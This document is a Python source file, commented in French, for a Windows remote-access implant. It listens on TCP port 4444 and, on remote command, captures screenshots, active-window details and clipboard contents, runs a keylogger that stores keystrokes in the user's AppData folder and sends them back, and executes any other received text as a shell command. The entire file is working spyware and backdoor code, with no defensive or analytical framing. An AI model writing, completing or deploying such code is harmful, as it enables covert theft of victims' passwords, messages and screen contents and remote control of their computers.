import socket
import subprocess as sp
import asyncio
import pyautogui
import os
import time
import struct
import threading
import win32gui
import win32process
import psutil
from pynput import keyboard
import json
from datetime import datetime
import pyperclip

host = "0.0.0.0"
port = 4444

keylog_file = os.path.join(os.environ["APPDATA"], "keylog.json")
keylog_listener = None

keylog_buffer = []
last_minute = ""

# Vérifier si le fichier existe, sinon on le crée en mode dict
if not os.path.exists(keylog_file):
    with open(keylog_file, "w", encoding="utf-8") as f:
        json.dump({}, f)


def save_keylog_buffer():
    global keylog_buffer, last_minute
    try:
        with open(keylog_file, "r", encoding="utf-8") as f:
            try:
                data = json.load(f)
                if not isinstance(data, dict):
                    data = {}
            except:
                data = {}

        if keylog_buffer:
            current_text = data.get(last_minute, "")
            current_text += "".join(keylog_buffer)
            data[last_minute] = current_text

            with open(keylog_file, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False)

            keylog_buffer = []

    except Exception as e:
        print(f"[!] Erreur en sauvegardant le buffer : {e}")


def on_press(key):
    global keylog_buffer, last_minute
    try:
        now = datetime.now()
        current_minute = now.strftime("%Y-%m-%d %H:%M")

        # Si la minute a changé, sauvegarder les touches précédentes
        if current_minute != last_minute:
            save_keylog_buffer()
            last_minute = current_minute

        # Gestion des touches
        if hasattr(key, 'char') and key.char is not None:
            keylog_buffer.append(key.char)
        elif key == keyboard.Key.space:
            keylog_buffer.append(" ")
        elif key == keyboard.Key.enter:
            keylog_buffer.append("\n")
        elif key == keyboard.Key.backspace:
            if keylog_buffer:
                keylog_buffer.pop()
        elif key == keyboard.Key.shift:
            keylog_buffer.append("<Shift>")
        elif key == keyboard.Key.ctrl:
            keylog_buffer.append("<Ctrl>")
        elif key == keyboard.Key.alt:
            keylog_buffer.append("<Alt>")
        elif key == keyboard.Key.tab:
            keylog_buffer.append("<Tab>")
        elif key == keyboard.Key.caps_lock:
            keylog_buffer.append("<Caps Lock>")

        # Détecter la combinaison Ctrl+V et récupérer le presse-papier
        elif key == keyboard.KeyCode.from_char('\u0016') and keyboard.Listener.ctrl_pressed:
            clipboard_content = get_clipboard_content()
            if clipboard_content:
                keylog_buffer.append(f"\n[Ctrl+V] Clipboard Content: {clipboard_content}\n")
                print(f"[+] Clipboard content captured: {clipboard_content}")
        else:
            keylog_buffer.append(f"<{key.name}>")

    except Exception as e:
        print(f"Erreur dans le keylogger: {e}")


def keylogger_thread():
    global keylog_listener
    keylog_listener = keyboard.Listener(on_press=on_press)
    keylog_listener.start()
    keylog_listener.join()


def get_clipboard_content():
    try:
        clipboard_content = pyperclip.paste()  # Récupère le contenu du presse-papier
        return clipboard_content
    except Exception as e:
        print(f"Erreur lors de la récupération du presse-papier : {e}")
        return None


def take_screenshot():
    ip = socket.gethostbyname(socket.gethostname())
    hostname = socket.gethostname()
    timestamp = time.strftime("%Y%m%d-%H%M%S", time.localtime()) + f"-{int(time.time() * 1000) % 1000}"
    filename = f"{ip}_{hostname}_{timestamp}.png"
    screenshot_path = os.path.join("C:/Users/Public/Downloads", filename)
    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_path)
    return screenshot_path, filename


def get_active_window_info():
    try:
        window = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(window)
        _, pid = win32process.GetWindowThreadProcessId(window)
        process = psutil.Process(pid)
        return f"Titre: {title}\nProcessus: {process.name()}\nPID: {pid}\nExécutable: {process.exe()}"
    except Exception as e:
        return f"Erreur lors de la récupération des informations: {str(e)}"


async def execute_command(command):
    process = sp.Popen(command, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE, text=True)
    out, err = process.communicate()
    return out + err


async def handle_client(conn):
    global keylog_listener

    while True:
        try:
            command = conn.recv(1024).decode()
            if not command:
                break

            if command == "SCREENSHOT":
                screenshot_path, filename = take_screenshot()
                with open(screenshot_path, "rb") as file:
                    data = file.read()
                file_size = len(data)
                conn.sendall(struct.pack("!I", file_size))
                conn.sendall(filename.encode().ljust(100))
                conn.sendall(data)

            elif command == "GET_ACTIVE_WINDOW":
                info = get_active_window_info()
                conn.send(info.encode())

            elif command == "START_KEYLOG":
                if keylog_listener is None or not keylog_listener.running:
                    keylog_thread = threading.Thread(target=keylogger_thread)
                    keylog_thread.daemon = True
                    keylog_thread.start()
                    conn.send(b"Keylogger started")
                else:
                    conn.send(b"Keylogger already running")

            elif command == "STOP_KEYLOG":
                if keylog_listener:
                    keylog_listener.stop()
                    keylog_listener = None
                    conn.send(b"Keylogger stopped")
                else:
                    conn.send(b"No active keylogger")

            elif command == "GET_KEYLOGS":
                try:
                    save_keylog_buffer()  # Toujours flush les données avant envoi
                    if os.path.exists(keylog_file):
                        with open(keylog_file, "r", encoding="utf-8") as f:
                            data = f.read()
                        conn.sendall(data.encode())
                    else:
                        conn.sendall(b"[!] Aucun fichier de log trouve.")
                except Exception as e:
                    conn.sendall(f"[!] Erreur lors de l'envoi des logs: {str(e)}".encode())

            elif command == "GET_CLIPBOARD":
                clipboard_content = get_clipboard_content()
                conn.send(clipboard_content.encode() if clipboard_content else b"[!] Presse-papiers vide")

            else:
                result = await execute_command(command)
                conn.send(result.encode() if result else b"Commande executee sans resultat.\n")

        except Exception as e:
            print(f"[!] Exception dans handle_client: {e}")
            break

    conn.close()
    print("[-] Connexion fermée.")


async def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(5)
    print(f"[*] En attente de connexion sur {host}:{port}")

    while True:
        conn, addr = s.accept()
        print(f"[+] Connexion établie avec {addr[0]}")
        await handle_client(conn)


if __name__ == "__main__":
    asyncio.run(main())